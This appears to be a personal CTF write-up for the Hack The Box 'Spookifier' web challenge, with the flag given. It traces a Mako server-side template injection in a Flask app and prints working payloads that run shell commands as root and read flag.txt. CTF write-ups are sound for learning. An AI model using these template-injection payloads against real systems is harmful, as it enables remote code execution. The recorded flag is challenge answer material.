202210251447
Status:: #ctf
Tags: [[hack_the_boo]], [[SSTI]]

# hack_the_boo_spookifier
Platform: *hackthebox*
event: *hack the boo*
type: *web*
task: *There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?*
flag: **HTB{t3mpl4t3_1nj3ct10n_1s_$p00ky!!}**

# steps

### File tree of challenge
```
.
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   │   └── routes.py
│   │   ├── main.py
│   │   ├── static
│   │   │   ├── css
│   │   │   │   ├── index.css
│   │   │   │   └── nes.css
│   │   │   └── images
│   │   │       └── vamp.png
│   │   ├── templates
│   │   │   └── index.html
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt

```

### Endpoints
- `/`
### Logic
Program reads name from `text` argument in URL and calls `spookify` with the name:
```python
@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html',output=converted)
    
    return render_template('index.html',output='')
```

file `utils.py` also contains:
- dictionaries for leter substitution, but `font4` seems to keep leters unchanged.
- function to generate string from `mako` template:
```python
def generate_render(converted_fonts):
result = '''
	<tr>
		<td>{0}</td>
       </tr>
       
	<tr>
       	<td>{1}</td>
       </tr>
       
	<tr>
       	<td>{2}</td>
       </tr>
       
	<tr>
       	<td>{3}</td>
    </tr>
	'''.format(*converted_fonts)
return Template(result).render()
```

### Exploiting
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md) has example of SSTI for mako. 

Trying RCE with `system` function
`${self.module.cache.util.os.system("id").read()}`
which returns `Internal server error`

Attempt to use `popen` function:
`${self.module.cache.util.os.popen("id").read()}`
and it works as intented `uid=0(root) gid=0(root) groups=1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)`

It's time to get the flag:
`${self.module.cache.util.os.popen("cat ../flag.txt").read()}`




